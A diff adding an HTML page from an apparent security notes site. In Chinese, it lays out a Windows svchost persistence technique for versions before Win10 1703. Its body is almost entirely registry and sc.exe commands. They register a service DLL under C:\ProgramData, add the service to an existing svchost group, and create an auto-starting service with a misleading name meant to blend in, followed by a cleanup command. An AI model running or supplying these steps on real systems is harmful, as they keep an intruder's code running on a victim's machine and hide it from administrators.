@@ -1,0 +1,154 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    
+    
+    <link rel="shortcut icon" href="../../img/favicon.ico">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>svchost权限维持（WIN10 1703之后无效） - Share Docs</title>
+    <link href="../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "\u67e5\u8be2\u7248\u672c\uff0c1703\u4ee5\u4e0a\u4e0d\u53ef\u7528", url: "#_top", children: [
+          ]},
+          {title: "\u7b2c\u4e00\u6b65", url: "#_1", children: [
+          ]},
+          {title: "\u7b2c\u4e8c\u6b65", url: "#_2", children: [
+          ]},
+          {title: "\u7b2c\u4e09\u6b65", url: "#_3", children: [
+          ]},
+          {title: "\u6e05\u9664", url: "#_4", children: [
+          ]},
+        ];
+
+    </script>
+    <script src="../../js/base.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/" class="btn btn-xs btn-link">
+        代码注入学习
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../crackmes.one%E7%BB%83%E4%B9%A0/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../crackmes.one%E7%BB%83%E4%B9%A0/" class="btn btn-xs btn-link">
+        Crackmes.one练习
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h2 id="1703">查询版本，1703以上不可用</h2>
+<pre><code class="language-text-plain">reg query HKLM\SOFTWARE\Microsoft\Windows&quot; &quot;NT\CurrentVersion /v ReleaseId
+</code></pre>
+<h2 id="_1">第一步</h2>
+<pre><code class="language-text-plain">添加注册表（用bof）
+reg add HKLM\SYSTEM\CurrentControlSet\services\RPCTerm\Parameters /v ServiceDll /t REG_EXPAND_SZ /d C:\ProgramData\Microsoft\UserData.dll /f
+</code></pre>
+<h2 id="_2">第二步</h2>
+<pre><code class="language-text-plain">添加注册表（用bof）
+选一个存在的服务组名，将创建的服务添加到组
+查询服务组
+reg query &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost&quot; /se @
+选一个服务多的组，往组里添加一个REG_MULTI_SZ的值。需要先查询出原本的值，再重新写入
+
+win7
+reg add HKLM\SOFTWARE\Microsoft\Windows&quot; &quot;NT\CurrentVersion\Svchost /v DcomLaunch /t REG_MULTI_SZ /d &quot;Power\0PlugPlay\0DcomLaunch\0RPCTerm\0&quot; /f
+</code></pre>
+<h2 id="_3">第三步</h2>
+<pre><code class="language-text-plain">创建服务（用bof暂时bug）,指定添加的组，添加服务描述，混淆服务名
+sc.exe create RPCTerm binPath= &quot;c:\windows\System32\svchost.exe -k DcomLaunch&quot; DisplayName= &quot;Remote Desktop Termle Services&quot; type= share start= auto
+</code></pre>
+<h2 id="_4">清除</h2>
+<pre><code class="language-text-plain">reg delete HKLM\SYSTEM\CurrentControlSet\services\RPCTerm /f
+</code></pre>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/" class="btn btn-xs btn-link">
+        代码注入学习
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../crackmes.one%E7%BB%83%E4%B9%A0/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../crackmes.one%E7%BB%83%E4%B9%A0/" class="btn btn-xs btn-link">
+        Crackmes.one练习
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="container-fluid wm-page-content">
+  <p>Documentation built with <a href="https://www.mkdocs.org/">MkDocs</a> using <a href="https://github.com/gristlabs/mkdocs-windmill">Windmill</a> theme by Grist Labs.</p>
+</footer>
+
+</body>
+</html>
